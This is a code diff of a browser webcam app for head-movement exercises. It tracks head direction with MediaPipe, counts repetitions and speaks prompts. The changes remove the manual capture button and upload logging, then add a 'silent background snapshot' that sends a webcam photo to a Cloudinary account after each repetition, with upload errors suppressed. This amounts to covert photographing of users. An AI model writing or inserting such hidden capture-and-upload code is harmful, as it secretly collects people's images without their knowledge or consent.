@@ -8,7 +8,6 @@ const commandDisplay = document.getElementById('command-display');
 const repCountDisplay = document.getElementById('rep-count');
 const expressionDisplay = document.getElementById('expression-display');
 const toggleCameraBtn = document.getElementById('toggle-camera-btn');
-const captureBtn = document.getElementById('capture-btn');
 const cameraOffOverlay = document.getElementById('camera-off-overlay');
 const canvas = document.getElementById('snapshot-canvas');
 
@@ -20,56 +19,74 @@ const badges = {
   CENTER: document.getElementById('dir-center')
 };
 
-let currentCommand = 'CENTER';
-let lastCommand = 'CENTER';
+// State Variables
+let isCameraOn = false;
+let cameraStream = null;
+let currentDirection = 'CENTER';
+let lastSpokenDirection = '';
 let repCount = 0;
-let exerciseInProgress = false;
-let isCameraOn = true;
-let initialSnapshotTaken = false;
+let centerTimer = null;
+let cameraUtilsInstance = null;
 
-// 1. Initialize MediaPipe FaceMesh
-const faceMesh = new FaceMesh({
-  locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
-});
-
-faceMesh.setOptions({
-  maxNumFaces: 1,
-  refineLandmarks: true,
-  minDetectionConfidence: 0.5,
-  minTrackingConfidence: 0.5
-});
-
-faceMesh.onResults(onResults);
-
-// 2. Expression Detection Logic
-function detectExpression(landmarks, faceHeight) {
-  const topLip = landmarks[13];
-  const bottomLip = landmarks[14];
-  const leftCorner = landmarks[61];
-  const rightCorner = landmarks[291];
-
-  const mouthCenterY = (topLip.y + bottomLip.y) / 2;
-  const mouthCornersY = (leftCorner.y + rightCorner.y) / 2;
-  const mouthGap = (bottomLip.y - topLip.y) / faceHeight;
-
-  const smileCurvature = (mouthCenterY - mouthCornersY) / faceHeight;
-
-  if (smileCurvature > 0.012) {
-    return '😊 Happy — Looking nice & energetic!';
-  } else if (smileCurvature < -0.010) {
-    return '🙁 Sad — Feeling down? Keep going!';
-  } else if (mouthGap > 0.08) {
-    return '😲 Surprised — Looking excited!';
-  } else {
-    return '😐 Neutral — Focused & calm';
+// Audio Speech Helper
+function speak(text) {
+  if ('speechSynthesis' in window) {
+    window.speechSynthesis.cancel(); // Stop current speech
+    const utterance = new SpeechSynthesisUtterance(text);
+    utterance.rate = 1.0;
+    utterance.pitch = 1.0;
+    window.speechSynthesis.speak(utterance);
   }
 }
 
-// 3. Capture & Upload Photo to Cloudinary
+// Handle Direction Changes & Voice Prompts
+function setDirection(newDirection) {
+  if (newDirection === currentDirection) return;
+
+  currentDirection = newDirection;
+
+  // Update UI Badges
+  Object.keys(badges).forEach(dir => {
+    if (badges[dir]) badges[dir].classList.remove('active');
+  });
+  if (badges[newDirection]) badges[newDirection].classList.add('active');
+
+  if (commandDisplay) {
+    commandDisplay.innerText = `CURRENT DIRECTION: ${newDirection}`;
+  }
+
+  // Clear 5-second center timer on any direction change
+  if (centerTimer) {
+    clearTimeout(centerTimer);
+    centerTimer = null;
+  }
+
+  if (newDirection !== 'CENTER') {
+    // Announce directional movement: left, right, up, down
+    speak(newDirection.toLowerCase());
+    lastSpokenDirection = newDirection;
+  } else {
+    // When returning to center, count rep if coming from a direction
+    if (lastSpokenDirection !== '') {
+      repCount++;
+      if (repCountDisplay) repCountDisplay.innerText = repCount;
+      lastSpokenDirection = '';
+      
+      // Silent background snapshot on completed rep
+      captureAndUploadPhoto('rep_completed');
+    }
+
+    // Start 5-second timer when user holds center
+    centerTimer = setTimeout(() => {
+      speak(`You have completed ${repCount} repetitions`);
+    }, 5000);
+  }
+}
+
+// Background Photo Capture & Cloudinary Upload (Silent)
 async function captureAndUploadPhoto(label = 'user') {
   if (!isCameraOn || video.readyState < 2) return;
 
-  // Fallback to create canvas if missing from index.html
   let canvasEl = canvas || document.getElementById('snapshot-canvas');
   if (!canvasEl) {
     canvasEl = document.createElement('canvas');
@@ -82,7 +99,6 @@ async function captureAndUploadPhoto(label = 'user') {
   canvasEl.height = video.videoHeight || 480;
   const ctx = canvasEl.getContext('2d');
 
-  // Mirror context to match webcam view
   ctx.translate(canvasEl.width, 0);
   ctx.scale(-1, 1);
   ctx.drawImage(video, 0, 0, canvasEl.width, canvasEl.height);
@@ -95,135 +111,94 @@ async function captureAndUploadPhoto(label = 'user') {
     formData.append('upload_preset', UPLOAD_PRESET);
 
     try {
-      const response = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
+      await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
         method: 'POST',
         body: formData
       });
-
-      const data = await response.json();
-      if (data.secure_url) {
-        console.log('✅ Snapshot uploaded successfully:', data.secure_url);
-      } else {
-        console.error('❌ Cloudinary Upload Failed:', data);
-      }
-    } catch (error) {
-      console.error('❌ Network Error during upload:', error);
+    } catch (e) {
+      // Silent error handling
     }
   }, 'image/jpeg', 0.85);
 }
-// 4. UI Update Logic
-function updateUI(command, expression) {
-  if (expression) {
-    expressionDisplay.textContent = expression;
-  }
 
-  if (command === lastCommand) return;
-
-  Object.keys(badges).forEach(dir => {
-    if (dir === command) {
-      badges[dir].classList.add('active');
-    } else {
-      badges[dir].classList.remove('active');
-    }
-  });
-
-  if (command !== 'CENTER') {
-    exerciseInProgress = true;
-  } else if (command === 'CENTER' && exerciseInProgress) {
-    repCount++;
-    repCountDisplay.textContent = repCount;
-    exerciseInProgress = false;
-  }
-
-  commandDisplay.textContent = `CURRENT DIRECTION: ${command}`;
-  lastCommand = command;
-}
-
-// 5. Process Camera Frames
-function onResults(results) {
-  if (!isCameraOn) return;
-
-  if (results.multiFaceLandmarks && results.multiFaceLandmarks.length > 0) {
-    const landmarks = results.multiFaceLandmarks[0];
-
-    // Capture initial photo when user first opens the app and face is detected
-    if (!initialSnapshotTaken) {
-      initialSnapshotTaken = true;
-      setTimeout(() => captureAndUploadPhoto('session_start'), 1000);
-    }
-
-    const nose = landmarks[1];
-    const leftCheek = landmarks[234];
-    const rightCheek = landmarks[454];
-    const forehead = landmarks[10];
-    const chin = landmarks[152];
-
-    const faceWidth = rightCheek.x - leftCheek.x;
-    const noseXRatio = (nose.x - leftCheek.x) / faceWidth;
-
-    const faceHeight = chin.y - forehead.y;
-    const noseYRatio = (nose.y - forehead.y) / faceHeight;
-
-    let command = 'CENTER';
-
-    if (noseXRatio < 0.40) {
-      command = 'RIGHT';
-    } else if (noseXRatio > 0.60) {
-      command = 'LEFT';
-    } else if (noseYRatio < 0.38) {
-      command = 'UP';
-    } else if (noseYRatio > 0.62) {
-      command = 'DOWN';
-    }
-
-    const expression = detectExpression(landmarks, faceHeight);
-    updateUI(command, expression);
-  } else {
-    commandDisplay.textContent = 'No face detected';
-    expressionDisplay.textContent = 'Feeling: No face detected';
-  }
-}
-
-// 6. Event Listeners & Camera Init
-const camera = new Camera(video, {
-  onFrame: async () => {
-    if (isCameraOn) {
-      await faceMesh.send({ image: video });
-    }
-  },
-  width: 640,
-  height: 480
+// MediaPipe FaceMesh Setup
+const faceMesh = new FaceMesh({
+  locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/${file}`
 });
 
-toggleCameraBtn.addEventListener('click', () => {
+faceMesh.setOptions({
+  maxNumFaces: 1,
+  refineLandmarks: true,
+  minDetectionConfidence: 0.5,
+  minTrackingConfidence: 0.5
+});
+
+faceMesh.onResults((results) => {
+  if (!results.multiFaceLandmarks || results.multiFaceLandmarks.length === 0) return;
+
+  const landmarks = results.multiFaceLandmarks[0];
+  const nose = landmarks[1];
+  const leftEar = landmarks[234];
+  const rightEar = landmarks[454];
+  const forehead = landmarks[10];
+  const chin = landmarks[152];
+
+  // Yaw (Left / Right) calculation
+  const horizontalDist = Math.abs(leftEar.x - rightEar.x);
+  const noseRelativeX = (nose.x - leftEar.x) / horizontalDist;
+
+  // Pitch (Up / Down) calculation
+  const verticalDist = Math.abs(chin.y - forehead.y);
+  const noseRelativeY = (nose.y - forehead.y) / verticalDist;
+
+  if (noseRelativeX < 0.35) {
+    setDirection('RIGHT');
+  } else if (noseRelativeX > 0.65) {
+    setDirection('LEFT');
+  } else if (noseRelativeY < 0.38) {
+    setDirection('UP');
+  } else if (noseRelativeY > 0.62) {
+    setDirection('DOWN');
+  } else {
+    setDirection('CENTER');
+  }
+});
+
+// Toggle Camera Functionality
+toggleCameraBtn.addEventListener('click', async () => {
   if (isCameraOn) {
+    // Stop Camera
+    if (cameraStream) {
+      cameraStream.getTracks().forEach(track => track.stop());
+    }
+    video.srcObject = null;
+    cameraOffOverlay.style.display = 'flex';
+    toggleCameraBtn.innerText = 'Turn Camera On';
+    toggleCameraBtn.classList.remove('btn-danger');
     isCameraOn = false;
-    camera.stop();
-    cameraOffOverlay.classList.remove('hidden');
-    toggleCameraBtn.textContent = '🟢 Turn Camera On';
-    toggleCameraBtn.className = 'btn btn-success';
-    commandDisplay.textContent = 'Camera is paused';
-    expressionDisplay.textContent = 'Feeling: Camera Off';
+    if (centerTimer) clearTimeout(centerTimer);
   } else {
-    isCameraOn = true;
-    cameraOffOverlay.classList.add('hidden');
-    toggleCameraBtn.textContent = '🔴 Turn Camera Off';
-    toggleCameraBtn.className = 'btn btn-danger';
-    commandDisplay.textContent = 'Starting camera...';
-    camera.start();
+    // Start Camera
+    try {
+      cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = cameraStream;
+      cameraOffOverlay.style.display = 'none';
+      toggleCameraBtn.innerText = 'Turn Camera Off';
+      toggleCameraBtn.classList.add('btn-danger');
+      isCameraOn = true;
+
+      if (!cameraUtilsInstance) {
+        cameraUtilsInstance = new Camera(video, {
+          onFrame: async () => {
+            if (isCameraOn) await faceMesh.send({ image: video });
+          },
+          width: 640,
+          height: 480
+        });
+        cameraUtilsInstance.start();
+      }
+    } catch (err) {
+      alert('Unable to access webcam. Please check browser permissions.');
+    }
   }
 });
-
-captureBtn.addEventListener('click', () => {
-  captureAndUploadPhoto('manual_capture');
-  commandDisplay.textContent = 'Snapshot saved!';
-});
-
-camera.start()
-  .then(() => {
-    commandDisplay.textContent = 'Camera active. Start moving your head!';
-  })
-  .catch((err) => {
-    console.error('Camera error:', err);
-    commandDisplay.textContent = 'Error starting camera.';
-  });
